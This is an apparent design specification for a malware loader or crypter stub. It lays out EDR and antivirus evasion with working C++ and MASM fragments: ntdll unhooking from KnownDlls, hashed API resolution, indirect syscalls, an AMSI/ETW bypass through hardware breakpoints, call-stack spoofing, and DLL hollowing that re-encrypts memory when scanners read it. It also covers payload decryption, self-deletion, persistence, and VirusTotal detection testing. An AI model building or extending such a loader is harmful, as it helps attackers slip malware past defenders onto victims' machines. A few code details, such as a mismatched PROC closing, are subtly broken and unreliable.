# Tier 1: Core Evasion — Detailed Specification

**Parent:** [Master Design](2026-05-25-xen-premium-master-design.md)
**Status:** Approved
**Priority:** MUST HAVE
**Milestone:** M1 (Phase 1: #1-3) + M2 (Phase 2: #4-6)

---

## Phase 1: Foundation

### 1. KnownDlls Unhooking

**Files to modify:** `Unhook.h`, `Unhook.cpp`
**Files to add:** None (NtOpenSection/NtMapViewOfSection in IndirectSyscall.asm)
**StubConfig flag:** `bUnhookKnownDlls` (renamed from `bUnhookNtdll`)

#### Architecture

```
Boot Sequence Step (EARLIEST — inside TLS callback, before WinMain):

TLS Callback Mini-Unhook (ПРОБЛЕМА #1 — AMSI hooks стоят ДО WinMain):
  Если AMSI/EDR хуки устанавливаются при загрузке процесса (до WinMain),
  TLS callback должен выполнить минимальный unhooking:
  1. Inline resolve NtOpenSection/NtMapViewOfSection через GS:[0x60] PEB walk
     (не через ApiResolver — он ещё не инициализирован)
  2. Открыть \KnownDlls\ntdll.dll
  3. Замапить чистую копию, скопировать .text поверх hooked
  4. Всё внутри TLS callback — до任何 другого кода stub

WinMain Full Unhooking (после TLS callback):
  1. Resolve NtOpenSection, NtMapViewOfSection через ApiResolver (теперь доступен)
  2. Open \KnownDlls\ntdll.dll via NtOpenSection (SECTION_MAP_READ | SECTION_MAP_EXECUTE)
  3. Map with NtMapViewOfSection, SEC_IMAGE flag → gets full PE view with sections
  4. Verify .text section is clean (compare with TLS callback result)
  5. If still hooked: copy clean .text over hooked .text
  6. NtUnmapViewOfSection to release clean mapping
  7. FlushInstructionCache on modified region
```

#### Key Details

- Object namespace path: `\KnownDlls\ntdll.dll` (NT path, not DOS)
- SECTION_MAP_READ | SECTION_MAP_EXECUTE for mapping permissions
- SEC_IMAGE gives us proper PE section mapping (not raw file view)
- **TLS Callback Mini-Unhook (КРИТИЧНО):** AMSI хуки устанавливаются при загрузке процесса.
  TLS callback срабатывает ДО WinMain, но ПОСЛЕ загрузки DLL.
  Если мы не сделаем unhooking в TLS callback, первый AmsiScanBuffer вызов
  (например, при LoadLibrary для CLR) пройдёт через хук.
  Решение: минимальный inline PEB walk + KnownDlls unhooking прямо в TlsCallback.cpp.
- Fallback: if `\KnownDlls\` path fails (rare on older Windows), revert to existing disk-based unhooking

#### Implementation Notes

```cpp
// Unhook.cpp — new implementation outline
namespace KnownDllsUnhook {
    bool UnhookNtdll() {
        // 1. Build NT path string on stack: "\KnownDlls\ntdll.dll"
        WCHAR path[] = { '\\','K','n','o','w','n','D','l','l','s','\\','n','t','d','l','l','.','d','l','l',0 };

        // 2. Initialize OBJECT_ATTRIBUTES on stack
        UNICODE_STRING usPath;
        usPath.Buffer = path;
        usPath.Length = sizeof(path) - sizeof(WCHAR);
        usPath.MaximumLength = sizeof(path);

        OBJECT_ATTRIBUTES oa = { sizeof(OA), NULL, &usPath, OBJ_CASE_INSENSITIVE };

        // 3. NtOpenSection → get section handle
        HANDLE hSection;
        NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);

        // 4. NtMapViewOfSection with SEC_IMAGE
        PVOID pCleanMap = NULL;
        SIZE_T viewSize = 0;
        NtMapViewOfSection(hSection, NtCurrentProcess(), &pCleanMap, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

        // 5. Find .text in both, copy clean over hooked
        // ... (parse PE headers in both mappings)

        // 6. Cleanup
        NtUnmapViewOfSection(NtCurrentProcess(), pCleanMap);
        NtClose(hSection);
    }
}
```

#### Testing

- Verify: after unhooking, `ntdll!NtAllocateVirtualMemory` matches clean version (compare first 16 bytes)
- Test against: Defender AMSI hooks should be removed
- Regression: existing GodMode/Phantom/ModuleStomp still work

---

### 2. Full Dynamic API Resolution

**Files to modify:** `ApiResolver.h`, `ApiResolver.cpp`, `Entry.cpp`
**Files to add:** None in stub; `ApiHashDB.cs` in builder
**StubConfig flag:** `bFullDynamicAPI`

#### Architecture

```
Current IAT (imported functions):
  ntdll.dll:    NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory, RtlInitUnicodeString, NtOpenProcess, NtClose, ...
  kernel32.dll: LoadLibraryA, GetProcAddress, VirtualAlloc, VirtualProtect, GetModuleHandleA, ...

Target IAT (minimal):
  ntdll.dll:    NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory (needed before ApiResolver can walk)
  kernel32.dll: (nothing — all resolved via PEB walk)

Resolution Chain:
  1. PEB → LDR_DATA_TABLE_ENTRY → InMemoryOrderModuleList → module base
  2. Parse PE exports → Name pointer table → CRC32C(name) match
  3. Return function address

Hash Algorithm: CRC32C (Castagnoli) — hardware-accelerated on modern CPUs via SSE4.2
Fallback: djb2 for environments without CRC32C instruction
```

#### Hash Table Generation (Builder Side)

```csharp
// ApiHashDB.cs — builder generates hash table
public class ApiHashEntry {
    public uint ModuleHash;    // CRC32C of module name (lowercase, wide)
    public uint FunctionHash;  // CRC32C of function name (ASCII)
    public string Module;      // For reference only
    public string Function;    // For reference only
}

// Generated table stored in XRESRC marker after cipher params
// Stub reads: ResearchParams = [cipher_params][api_hash_table]
```

#### Stack-Built Strings

All module and function names are built on the stack using existing `StackStr.h` macros, then hashed. No string literals in the binary.

```cpp
// Example: resolving NtCreateThreadEx
STACK_STR(modNtdll, "ntdll.dll");
STACK_STR(funcNtCreateThreadEx, "NtCreateThreadEx");
PVOID pNtCreateThreadEx = ApiResolver::GetFunctionAddr(modNtCreateThreadEx, funcNtCreateThreadEx);
```

#### Expanded Function List

Current: 28 function hashes, 3 modules
Target: ~60-80 function hashes covering:
- ntdll: memory management, process/thread, section/mapping, registry, file I/O
- kernel32: process, module, synchronization, file mapping
- user32: (minimal — message dispatch if needed)
- clr: (for .NET assembly loading — Tier 2)

#### Testing

- IAT dump via `dumpbin /imports stub.exe` — should show only 3-4 ntdll entries
- All existing functionality works without imported kernel32 functions
- CRC32C hash correctness verified against known test vectors

---

### 3. Indirect Syscalls

**Files to modify:** `Syscall.h`, `Syscall.cpp`
**Files to add:** `IndirectSyscall.asm` (MASM x64)
**StubConfig flag:** `bIndirectSyscalls` (renamed from `bSyscall`)

#### Architecture

```
Direct Syscall (current):
  mov r10, rcx
  mov eax, SSN          ; SSN extracted from ntdll
  syscall               ; transition to kernel — EDR sees return to our code
  ret

Indirect Syscall Tier 1 — Gadget Jump (preferred):
  mov r10, rcx
  mov eax, SSN
  jmp [gadget]          ; gadget = 0F 05 C3 in ntdll/kernel32/kernelbase
                         ; EDR sees return address in legitimate module!

Indirect Syscall Tier 2 — Hotpatch Trampoline (fallback when gadget pool empty):
  Scan ntdll for hotpatch area: 5 NOP bytes (CC CC CC CC CC) before functions
  OR the 2-byte nop at function start (mov edi, edi = 8B FF)
  Write trampoline: jmp to our syscall stub
  Then call through ntdll function entry → appears as legitimate ntdll call
  NOTE: modifies ntdll bytes (2-5 bytes), but in hotpatch area (expected by OS)

Direct Syscall Tier 3 — Fallback (when no gadgets AND no hotpatch):
  Revert to current direct syscall approach
  mov r10, rcx; mov eax, SSN; syscall; ret
  Less stealthy but guaranteed to work
```

#### Gadget Pool

```
Gadget Discovery (at stub runtime):
  1. Scan ntdll.dll .text section for 0F 05 C3 bytes
  2. Scan kernel32.dll .text section for 0F 05 C3 bytes
  3. Scan kernelbase.dll .text section for 0F 05 C3 bytes
  4. Store found gadgets in array: { address, module_index }
  5. Each indirect syscall call picks random gadget from pool

Gadget Selection:
  - Prefer gadgets in modules that commonly contain syscall;ret (ntdll, kernel32, kernelbase)
  - Avoid gadgets in our own code section
  - Multiple gadgets per syscall call for anti-pattern detection

ПРОБЛЕМА #2 — Gadget pool может быть пуст:
  На некоторых сборках Windows (особенно Server, IoT) gadgets 0F 05 C3 могут
  отсутствовать или быть в недостаточном количестве.

Multi-Tier Fallback Strategy:
  Tier 1 (preferred): Gadget jump — jmp [gadget] к 0F 05 C3
  Tier 2 (fallback):  Hotpatch trampoline — используем NOP-области перед ntdll функциями
                      (5 байт hotpatch: CC CC CC CC CC перед функцией, или mov edi,edi = 8B FF)
                      Пишем туда jmp на наш syscall stub, вызов идёт через ntdll entry
  Tier 3 (last resort): Direct syscall — revert к текущему подходу
                         mov r10,rcx; mov eax,SSN; syscall; ret
                         Менее скрытный, но гарантированно работает

Выбор тиера происходит при инициализации:
  1. Сканируем gadgets → если >= 3 найдено → Tier 1
  2. Если < 3 gadgets → сканируем hotpatch области → Tier 2
  3. Если hotpatch тоже недоступен → Tier 3 (прямые syscalls)
  Выбранный тиер записывается в stub memory и используется для всех syscall вызовов
```

#### ASM Trampoline Template

```asm
; IndirectSyscall.asm — MASM x64

.DATA
    g_SSN       DWORD ?
    g_GadgetAddr QWORD ?

.CODE

; Generic indirect syscall trampoline
; SSN and gadget address set before each call
IndirectSyscallTrampoline PROC
    mov r10, rcx            ; Windows x64 syscall convention
    mov eax, g_SSN          ; System Service Number
    jmp QWORD PTR [g_GadgetAddr]  ; Jump to gadget (syscall; ret in legitimate module)
IndirectSyscallTrampoline ENDP

; Per-syscall typed trampolines (optional, for type safety)
NtAllocateVirtualMemoryIndirect PROC
    mov r10, rcx
    mov eax, g_SSN_NtAllocateVirtualMemory
    jmp QWORD PTR [g_Gadget_NtAllocateVirtualMemory]
NtAllocateVirtualMemoryIndirect ENDP

NtProtectVirtualMemoryIndirect PROC
    mov r10, rcx
    mov eax, g_SSN_NtProtectVirtualMemory
    jmp QWORD PTR [g_Gadget_NtProtectVirtualMemory]
NtProtectVirtualMemoryIndirect ENDP

; ... more per-syscall trampolines

END
```

#### SSN Extraction Enhancement

```
Current: pattern matching (4C 8B D1 B8 ?? ?? ?? ??) + Halo's Gate ±32
Enhanced:
  1. Pattern matching (primary)
  2. Halo's Gate ±32 (fallback for hooked functions)
  3. Syscall table sorting (new): extract all SSNs, sort by address, assign sequential numbers
  4. Fresh ntdll from KnownDlls unhooking (Tier 1 #1) — pattern matching on clean copy
```

#### Expanded Syscall Coverage

Current: 4 syscalls (NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory)
Target: ~15-20 syscalls:
- Memory: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory, NtReadVirtualMemory
- Process/Thread: NtOpenProcess, NtCreateThreadEx, NtOpenThread, NtSuspendThread, NtResumeThread
- Section: NtCreateSection, NtOpenSection, NtMapViewOfSection, NtUnmapViewOfSection
- File: NtCreateFile, NtReadFile, NtWriteFile, NtClose
- Registry: NtOpenKey, NtSetValueKey, NtDeleteValueKey
- Other: NtQueryInformationProcess, NtSetInformationThread, NtContinue (for Ekko sleep)

#### Testing

- All existing functionality works with indirect syscalls
- Gadget pool populated successfully on Windows 10/11
- Stack trace from kernel shows return address in legitimate module (not our code)
- Syscall works even when ntdll functions are hooked (Halo's Gate + sorting fallback)

---

## Phase 2: Core Evasion

### 4. Patchless AMSI/ETW Bypass

**Files to modify:** `Telemetry.h`, `Telemetry.cpp`
**Files to add:** `VehHandler.asm` (context manipulation)
**StubConfig flag:** `bPatchlessAmsiEtw` (replaces `bPatchAmsi` + `bPatchEtw`)

#### Architecture

```
Current (byte-patching):
  AMSI:  Overwrite amsi!AmsiScanBuffer first 6 bytes → mov eax, 0x80070057; ret
  ETW:   Overwrite ntdll!EtwEventWrite first 4 bytes → xor rax,rax; ret
  Problem: EDR can detect modified bytes in memory

New (patchless — VEH + hardware breakpoints):
  1. Install VEH handler (AddVectoredExceptionHandler)
  2. Set hardware breakpoint DR0 on amsi!AmsiScanBuffer (execute)
  3. Set hardware breakpoint DR1 on ntdll!EtwEventWrite (execute)
  4. (Optional) Set hardware breakpoint on clr!AmsiScan for .NET assembly loading
  5. When BP fires → VEH handler:
     a. For AMSI: set RAX = 0x80070057 (E_INVALIDARG), advance RIP past first instruction
     b. For ETW: set RAX = 0 (STATUS_SUCCESS), advance RIP past first instruction
     c. Return EXCEPTION_CONTINUE_EXECUTION
  6. Zero bytes modified in memory — EDR memory scanners see original code intact
```

#### VEH Handler Implementation

```cpp
// Telemetry.cpp — new implementation
namespace PatchlessBypass {
    static PVOID g_VehHandle = NULL;
    static PVOID g_AmsiAddr = NULL;   // amsi!AmsiScanBuffer
    static PVOID g_EtwAddr = NULL;    // ntdll!EtwEventWrite
    static PVOID g_ClrAmsiAddr = NULL; // clr!AmsiScan (optional)

    LONG CALLBACK VehHandler(PEXCEPTION_POINTERS pExInfo) {
        if (pExInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
            ULONG_PTR ip = pExInfo->ContextRecord->Rip;

            if (ip == (ULONG_PTR)g_AmsiAddr) {
                // AMSI bypass: return E_INVALIDARG
                pExInfo->ContextRecord->Rax = 0x80070057;
                pExInfo->ContextRecord->Rip += 6; // skip first instruction
                return EXCEPTION_CONTINUE_EXECUTION;
            }

            if (ip == (ULONG_PTR)g_EtwAddr) {
                // ETW bypass: return 0
                pExInfo->ContextRecord->Rax = 0;
                pExInfo->ContextRecord->Rip += 4; // skip first instruction
                return EXCEPTION_CONTINUE_EXECUTION;
            }

            if (g_ClrAmsiAddr && ip == (ULONG_PTR)g_ClrAmsiAddr) {
                // CLR AMSI bypass
                pExInfo->ContextRecord->Rax = 0x80070057;
                pExInfo->ContextRecord->Rip += 6;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    bool EnablePatchless() {
        // 1. Resolve target addresses via ApiResolver
        g_AmsiAddr = ApiResolver::GetFunctionAddr(L"amsi.dll", "AmsiScanBuffer");
        g_EtwAddr = ApiResolver::GetFunctionAddr(L"ntdll.dll", "EtwEventWrite");

        // 2. Install VEH handler
        g_VehHandle = AddVectoredExceptionHandler(1, VehHandler);

        // 3. Set hardware breakpoints via SetThreadContext
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        ctx.Dr0 = (ULONG_PTR)g_AmsiAddr;  // BP on AMSI
        ctx.Dr1 = (ULONG_PTR)g_EtwAddr;   // BP on ETW
        ctx.Dr7 = (1 << 0) | (1 << 2);    // Enable DR0 and DR1 local, execute BP
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        SetThreadContext(GetCurrentThread(), &ctx);

        return true;
    }
}
```

#### Conflict Resolution: VEH Handler Merging (ПРОБЛЕМА #8)

**Текущая ситуация:** GuardPage.cpp уже использует VEH (STATUS_GUARD_PAGE_VIOLATION).
Новый PatchlessBypass тоже использует VEH (STATUS_SINGLE_STEP).
Anti-MemScan scanner detection тоже использует VEH (STATUS_GUARD_PAGE_VIOLATION для scanner detect).
Три подписчика на один VEH — потенциальные конфликты.

**Решение: Unified VEH Dispatcher — ТРЕБУЕТ POC**

```
POC план:
  1. Создать минимальный C++ проект
  2. Установить ОДИН AddVectoredExceptionHandler(1, UnifiedVehHandler)
  3. Установить DR0 (AMS) + DR1 (ETW) hardware breakpoints
  4. Установить PAGE_GUARD на test region
  5. Триггерить: AmsiScanBuffer call → STATUS_SINGLE_STEP → наш handler
  6. Триггерить: read guarded page → STATUS_GUARD_PAGE_VIOLATION → наш handler
  7. Триггерить: одновременный BP + guard page → проверяем dispatch order
  8. Проверить: SetThreadContext DR0-DR7 после VEH handler → корректные значения
  9. Проверить: GetThreadContext из другого потока → не видим наши DR регистры

Критерий успеха: все три сценария работают корректно, нет конфликтов,
нет потерянных исключений, DR регистры не повреждаются.

Если POC проваливается → раздельные VEH handlers с приоритетом:
  AddVectoredExceptionHandler(1, PatchlessBypassHandler)   — приоритет 1
  AddVectoredExceptionHandler(2, GuardPageHandler)          — приоритет 2
  Каждый handler возвращает EXCEPTION_CONTINUE_SEARCH если не его exception code
```

Unified VEH handler (после успешного POC):

```cpp
LONG CALLBACK UnifiedVehHandler(PEXCEPTION_POINTERS pExInfo) {
    switch (pExInfo->ExceptionRecord->ExceptionCode) {
        case STATUS_SINGLE_STEP:
            return PatchlessBypass::HandleSingleStep(pExInfo);

        case STATUS_GUARD_PAGE_VIOLATION:
            return GuardPage::HandleGuardPage(pExInfo);

        default:
            return EXCEPTION_CONTINUE_SEARCH;
    }
}
```

#### Testing

- AMSI: `AmsiScanBuffer` returns 0x80070057 without any byte modification
- ETW: `EtwEventWrite` returns 0 without any byte modification
- Memory scan of amsi.dll and ntdll.dll shows original bytes intact
- Conflict test: GuardPage VEH and PatchlessBypass VEH coexist correctly

---

### 5. Call Stack Spoofing

**Files to add:** `StackSpoof.h`, `StackSpoof.cpp`, `StackSpoof.asm`
**StubConfig flag:** `bSpoofCallStack`
**HIGH RISK — требует POC перед реализацией (см. мастер-документ §10)**

#### ПРОБЛЕМА #3 — Сложность переоценена

Полноценный RSP pivot + UNWIND_INFO-aware spoofing — это не "пара страниц кода",
а недели отладки. Edge cases:
- Исключения во время spoofed call → краш (stack walker не может traverse)
- Nested spoofed calls → RSP pivot конфликтует
- Фреймы неправильного размера → stack walker детектит аномалию
- Thread termination while spoofed → нечистый shutdown

#### Phased Approach

```
v1 — Simple Frame Spoof (M2, безопасный):
  Проблема: EDR stack walk показывает return address в нашем модуле.
  Решение v1: подменяем return address на gadget в легитимном модуле.

  Техника: "return address spoofing" (без RSP pivot)
  1. Находим gadget: jmp rbx (FF E3) или jmp rsi (FF E6) в ntdll/kernel32
  2. Перед вызовом sensitive функции:
     a. Сохраняем real return address в rbx/rsi
     b. Пушим на стек gadget address вместо нашего return address
     c. Вызываем функцию → она возвращается на gadget
     d. Gadget: jmp rbx/rsi → возвращает управление в наш код
  3. Стек-трейс: ... → ntdll!NtAllocateVirtualMemory → ntdll!jmp_rbx → ???
     Вместо: ... → ntdll!NtAllocateVirtualMemory → suspicious_module!0x1234
  4. Преимущество: нет RSP pivot, нет fake stack, безопасно при исключениях
  5. Недостаток: стек-трейс не показывает полный легитимный chain
     (только один уровень подмены, не RtlUserThreadStart→BaseThreadInitThunk→...)

  v1 достаточно для обхода большинства EDR stack walkers.
  Defender и многие продукты проверяют только return address последнего фрейма.

v2 — RSP Pivot + Full Synthetic Frames (post-M2, HIGH RISK POC):
  Полная подмена стека как описано в оригинальной спеке.
  Реализуется ТОЛЬКО после успешного POC:

  POC требования:
  1. Spoofed call к NtAllocateVirtualMemory с RSP pivot
  2. RtlWalkFrameChain возвращает только легитимные адреса
  3. Исключение (STATUS_ACCESS_VIOLATION) внутри spoofed call
     корректно обрабатывается без краша
  4. 3+ nested spoofed calls работают без конфликтов
  5. Thread termination while spoofed не крашит процесс

  Если POC проваливается → остаёмся на v1.
```

#### v1 Implementation (Simple Frame Spoof)

```asm
; StackSpoof.asm — MASM x64
; v1: Return address spoof via jmp rbx/rsi gadget

.DATA
    g_JmpRbxGadget  QWORD ?    ; address of "jmp rbx" (FF E3) in ntdll/kernel32
    g_JmpRsiGadget  QWORD ?    ; address of "jmp rsi" (FF E6) in ntdll/kernel32
    g_CurrentGadget QWORD ?    ; alternating gadget for anti-pattern

.CODE

; SpoofCall: call function with spoofed return address
; rcx = target, rdx = arg1, r8 = arg2, r9 = arg3
; Uses rbx for return address storage, replaces [rsp+8] with gadget

SpoofCall PROC
    push rbx                    ; save rbx
    mov rbx, [rsp+8]            ; rbx = real return address (from caller's push)
    mov r10, [g_CurrentGadget]  ; load gadget address
    mov [rsp+8], r10            ; replace return address with gadget
    ; Stack now: [rsp] = saved rbx, [rsp+8] = gadget addr (jmp rbx)
    ; When target returns → jumps to gadget → gadget: jmp rbx → back to caller

    ; Call target (args already in rcx, rdx, r8, r9)
    call rcx

    ; After return from gadget, rbx still has real return address
    pop rbx                     ; restore rbx
    ret
SpoofCall ENDP

; Alternate gadget selector (call before each SpoofCall)
SpoofAlternateGadget PROC
    ; Toggle between jmp_rbx and jmp_rsi gadgets
    lea rax, [g_JmpRbxGadget]
    cmp [g_CurrentGadget], rax
    jne use_rbx
    mov rax, [g_JmpRsiGadget]
    mov [g_CurrentGadget], rax
    ret
use_rbx:
    mov rax, [g_JmpRbxGadget]
    mov [g_CurrentGadget], rax
    ret
SpoofAlternateGadget PROC

END
```

#### Gadget Discovery for v1

```
Для v1 нужны gadgets типа:
  FF E3  → jmp rbx  (2 bytes)
  FF E6  → jmp rsi  (2 bytes)
  FF 25 00 00 00 00 → jmp [rip] (6 bytes, indirect)

Поиск аналогичен gadget pool для indirect syscalls:
  1. Scan ntdll.dll .text for FF E3 and FF E6
  2. Scan kernel32.dll .text for same
  3. These 2-byte sequences are MUCH more common than 0F 05 C3
  4. Expected: 50-200+ occurrences per module
  5. Extremely unlikely to have empty pool
```

#### Spoofed Calls Catalog

Functions that MUST be called with spoofed return address:
- NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory
- NtWriteVirtualMemory, NtReadVirtualMemory
- NtCreateThreadEx, NtOpenProcess
- NtCreateSection, NtMapViewOfSection
- NtResumeThread, NtSetInformationThread

Functions that do NOT need spoofing:
- Crypto operations, string building, PEB walking
- Anything not touching the kernel

#### Testing

- v1: RtlWalkFrameChain не показывает наш модуль в return address
- v1: Gadget pool имеет 50+ записей (FF E3/FF E6)
- v2 POC: spoofed call с RSP pivot, 3 nested calls, exception handling — если POC проваливается, остаёмся на v1

---

### 6. Anti-Memory Scanning

**Files to modify:** `Phantom.h`, `Phantom.cpp`, `GuardPage.h`, `GuardPage.cpp`
**Files to add:** `AntiMemScan.h`, `AntiMemScan.cpp`
**StubConfig flag:** `bAntiMemScan`

#### Architecture

```
Three-Layer Defense:

Layer 1: Phantom DLL Backing (Image vs Private)
  Problem: PE-sieve classifies our memory as Private (no backing file) → suspicious
  Solution: Load legitimate DLL, hollow it, place our code inside
  Result: Memory appears as Image-backed by edputil.dll/charmap.dll/etc.

  Existing Phantom.cpp does this partially (DLL hollowing).
  Enhancement: ensure Image classification persists after hollowing.

Layer 2: Thread Origin Normalization
  Problem: Thread start address points to our code region → suspicious
  Solution:
  a) ThreadPool: thread appears started by ntdll!TppWorkpExecuteCallback
  b) Callback: thread appears started by ntdll!RtlUserThreadStart (via EnumSystemLocalesA etc.)
  c) Fiber: thread appears started by ntdll!RtlUserThreadStart (fiber context)
  Existing GodMode.cpp provides these; integrate with Anti-MemScan orchestration.

Layer 3: Anti-Scanner Detection
  Problem: PE-sieve/HollowsHunter/Moneta actively scan our process
  Solution:
  a) Detect scanning: monitor for ReadProcessMemory calls targeting our regions
  b) Respond: Guard Page + VEH auto re-encrypts before scanner reads
  c) Anti-Moneta: detect memory attribute scanning, respond with legitimate attributes
  Existing GuardPage.cpp provides auto re-encryption.
  Enhancement: broader scanner detection, attribute normalization.
```

#### Phantom DLL Enhancement

```cpp
// AntiMemScan.cpp — Phantom DLL with Image classification

namespace AntiMemScan {
    struct PhantomTarget {
        const WCHAR* dllName;    // Legitimate DLL to hollow
        DWORD sizeRequired;      // Minimum size needed
    };

    // Target DLLs with known characteristics
    static const PhantomTarget targets[] = {
        { L"edputil.dll",   0x30000 },  // ~200KB, commonly loaded
        { L"charmap.dll",   0x20000 },  // ~130KB, common Windows component
        { L"wbemcomn.dll",  0x40000 },  // ~260KB, WMI related
        { L"colorui.dll",   0x25000 },  // ~150KB, color management
        { L"dbghelp.dll",   0x50000 },  // ~330KB, debugging helper
    };

    bool SetupPhantomBacking(PVOID codeBase, SIZE_T codeSize) {
        // 1. Select DLL large enough for our code
        // 2. LoadLibrary → Image classification established
        // 3. Module Stomp: overwrite .text with our code
        // 4. Verify: VirtualQuery returns MEM_IMAGE (not MEM_PRIVATE)
        // 5. Thread start address inside this module
    }
}
```

#### Scanner Detection

```cpp
namespace AntiMemScan {
    struct ScanDetector {
        // Monitor for ReadProcessMemory from other processes
        // Using: NtSetInformationThread to hide thread
        // Using: PAGE_GUARD on our memory regions
        // When guard page hit: VEH handler re-encrypts region, returns to scanner with zeros

        static bool DetectAndRespond() {
            // 1. Set PAGE_GUARD on all our executable regions
            // 2. VEH handler on STATUS_GUARD_PAGE_VIOLATION:
            //    a. Check if faulting access is from external process
            //    b. If yes: XOR re-encrypt the page, let scanner read garbage
            //    c. After scanner returns: VEH re-decrypts page on our next access
            //    d. If no: normal GuardPage behavior
        }
    };
}
```

#### VEH Handler Integration

Unified VEH dispatcher in `Entry.cpp`:

```cpp
LONG CALLBACK UnifiedVehHandler(PEXCEPTION_POINTERS pExInfo) {
    switch (pExInfo->ExceptionRecord->ExceptionCode) {
        case STATUS_SINGLE_STEP:
            return PatchlessBypass::HandleSingleStep(pExInfo);

        case STATUS_GUARD_PAGE_VIOLATION:
            return GuardPage::HandleGuardPage(pExInfo);
            // GuardPage internally checks for external scanner vs internal access

        case STATUS_ACCESS_VIOLATION:
            // Reserved for future use
            return EXCEPTION_CONTINUE_SEARCH;

        default:
            return EXCEPTION_CONTINUE_SEARCH;
    }
}
```

#### Testing

- PE-sieve scan: our memory regions classified as Image, not Private
- HollowsHunter: no hollowed module detection
- Moneta: no suspicious memory attribute flags
- Thread start address points to legitimate module
- Guard Page VEH correctly differentiates scanner access vs internal access
- All existing GodMode/Phantom/ModuleStomp execution methods still work

---

## Phase Integration: Entry.cpp Boot Sequence Changes

Current 23-step sequence gets reorganized:

```cpp
// Entry.cpp — new boot sequence (Tier 1)
int WINAPI WinMain(...) {
    // ═══ PHASE -1: TLS Callback (ПРОБЛЕМА #1 — ДО WinMain) ═══
    // Выполняется в TlsCallback.cpp ПЕРЕД WinMain:
    // TlsStep 0: Inline PEB walk → resolve NtOpenSection/NtMapViewOfSection
    // TlsStep 1: KnownDlls mini-unhook (снимает AMSI/ETW хуки до первого вызова)
    // TlsStep 2: Anti-debug/VM basic checks (существующие AntiCheck)
    // TlsStep 3: Если обнаружен анализ → ExitProcess (до выполнения любого payload)

    // ═══ PHASE 0: Foundation (WinMain) ═══
    Step 1:  KnownDlls Full Unhooking (#1) — verify TLS callback unhooking succeeded
    Step 2:  Full Dynamic API Setup (#2) — PEB walk + hash table init
    Step 3:  Indirect Syscalls Init (#3) — SSN extraction + gadget pool (multi-tier)
    Step 4:  Patchless AMSI/ETW (#4) — Unified VEH + HWBP (depends on #1, #2)
    Step 5:  Anti-Debug/VM/Emulator (existing, unchanged)

    // ═══ PHASE 1: Memory Concealment ═══
    Step 6:  Call Stack Spoofing Setup (#5) — v1: gadget discovery + SpoofCall init
    Step 7:  Anti-Memory Scanning (#6) — Phantom DLL + Guard Page + scanner detect

    // ═══ PHASE 2: Payload Preparation ═══
    Step 8:  Key Derivation (existing, unchanged)
    Step 9:  Decrypt payload (existing cipher engines, unchanged)
    Step 10: MOTW strip (existing, unchanged)

    // ═══ PHASE 3: Execution ═══
    Step 11: Select execution method (RunPE/ModuleStomp/CallbackProxy/ThreadPool/Phantom)
    Step 12: Execute payload with spoofed calls (#5) and indirect syscalls (#3)
    Step 13: Guard Page activation (existing, unchanged)
    Step 14: Melt file (existing, unchanged)
    Step 15: Persistence (existing, unchanged)

    // ═══ PHASE 4: Sleep Obfuscation ═══
    Step 16: Sleep obfuscation (existing XOR sleep — Tier 2 upgrades to Ekko)

    return 0;
}
```

Key changes:
- **TLS Callback Phase -1 NEW:** Mini-unhooking ДО WinMain (ПРОБЛЕМА #1)
- Steps 1-4 are NEW (foundation phase)
- Steps 6-7 are NEW (memory concealment phase)
- Steps 8-16 are existing functionality, some modified to use indirect syscalls + spoofed calls
- Unified VEH handler installed at step 4, shared by PatchlessBypass + GuardPage (after POC)

---

## Build System Changes

### New ASM Files

```
Stub/
├── IndirectSyscall.asm    ← MASM x64, indirect syscall trampolines
├── VehHandler.asm         ← MASM x64, VEH context manipulation helpers
├── StackSpoof.asm         ← MASM x64, RSP pivot + spoofed call wrapper
```

### CMakeLists.txt / vcxproj Updates

- Add `.asm` files to build with MASM x64
- Add new `.cpp` files: AntiMemScan.cpp, StackSpoof.cpp
- Ensure `/Zp1` packing for StubConfig struct
- Add `/SAFESEH:NO` (ASLR-compatible but no safe exceptions for our VEH)
- Link with `/INCREMENTAL:NO` for deterministic section layout

---

## Regression Test Matrix

| Feature | Test | Pass Criteria |
|---|---|---|
| 8 Cipher Engines | Encrypt+decrypt roundtrip | Decrypted payload matches original |
| 18-Layer Metamorphism | Build with PEMutator | VT detection ≤ baseline |
| RunPE | Execute payload via RunPE | Payload runs correctly |
| ModuleStomp | Execute payload via ModuleStomp | Payload runs correctly |
| CallbackProxy | Execute via EnumSystemLocalesA | Payload runs correctly |
| ThreadPool | Execute via TpAllocWork | Payload runs correctly |
| Phantom DLL | Execute via Phantom hollowing | Payload runs correctly |
| GuardPage | Memory scanner test | Auto re-encrypts on scan |
| SleepObf | XOR sleep test | Memory encrypted during sleep |
| Key Validation | HWID mismatch test | Refuses to decrypt |
| StageLoad | Chunked decrypt test | Payload decrypted in 4KB chunks |
| TLS Callback | Debugger present test | Exits before WinMain |
